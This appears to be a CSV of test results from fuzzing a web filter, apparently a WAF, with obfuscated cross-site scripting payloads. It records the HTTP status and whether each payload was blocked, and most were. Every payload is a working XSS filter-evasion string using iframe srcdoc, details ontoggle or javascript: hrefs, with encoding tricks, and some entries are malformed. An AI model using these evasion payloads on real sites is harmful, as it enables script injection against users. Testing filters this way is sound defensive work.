@@ -1,0 +1,35 @@
+id,payload,status,response_size,blocked
+0,"<math href=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",403,146,True
+1,"<iframe srcdoc='&#60;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#62;'>",403,146,True
+2,"<iframe srcdoc=""&lt;script&gt;parent[&#x27;al&#x27;+&#x27;ert&#x27;](1)&lt;/script&gt;"">",403,146,True
+3,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+4,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+5,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+6,"<iframe srcdoc='&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;'>",403,146,True
+7,<iframe srcdoc='&#60;img src=x onerror=alert(1)&#62;'>,403,146,True
+8,"<details ontoggle=""top['al'+'ert']`1`""><summary>x</summary>",403,146,True
+9,"<iframe srcdoc=""&lt;script&gt;parent.alert&#40;1&#41;&lt;/script&gt;"">",403,146,True
+10,<iframe srcdoc='<script>parent.alert&#40;1&#41;</script>'>,403,146,True
+11,<details ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
+12,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+13,"<iframe srcdoc=""&lt;script&gt;parent.alert&#40;1&#41;&#40;1&#41;&#40;&#42;""><iframe srcdoc=&#40;&#41;&#40;&#42;&#40;&#41;&#40;&#42;&#41;&#40;&#41;&#40;&#42;&#41;&#40;&#41;&#4",403,146,True
+14,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+15,<details ontoggle=top['al'+'ert']`1`><summary>x</summary>,403,146,True
+16,<iframe srcdoc='<script>parent.alert&#40;1&#41;</script>'>,403,146,True
+17,"<iframe srcdoc=""&lt;script&gt;parent.alert&#40;1&gt;&#40;1&lt;/script&gt;"">",403,146,True
+18,"<iframe srcdoc=""&#60;img src=x onerror=alert&#40;1&#41;&#40;1&#42;>&#62;"">",403,146,True
+19,<,200,1523,False
+20,"<iframe srcdoc=""&lt;script&gt;parent.alert&#40;1&#41;&#40;1&lt;/script&gt;"">",403,146,True
+21,<details ontoggle=,403,146,True
+22,<iframe srcdoc='&#61;&#67;&#65;&#6c;&#65;&#72;&#74;&#75;&#61;&#40;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#61;&#41;'>,403,146,True
+23,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+24,"<math href=""javascript:alert`1`""><annotation-xml encoding=""UTF-8"" style=""display:block; width:100px; height:50px; background-color:red;"">x</annotation-xml></math>",403,146,True
+25,<math href=javascript:eval(atob`YWxlcnQoMSk`)>,403,146,True
+26,"<math href=""javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">",403,146,True
+27,<details open ontoggle=top['al'+'ert']`1`><summary>x</summary>,403,146,True
+28,<iframe srcdoc='&lt;script&gt;parent.alert&#40;1&#41;&#40;1&lt;/script&gt;'>,403,146,True
+29,<iframe srcdoc='&#60;img src=x onerror=top['al'+'ert']`1`>&#62;'>,403,146,True
+30,<iframe srcdoc='&lt;script&gt;parent.alert&lt;/script&gt;'>,403,146,True
+31,<math href=javascript:eval`\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029`>,403,146,True
+32,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+33,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
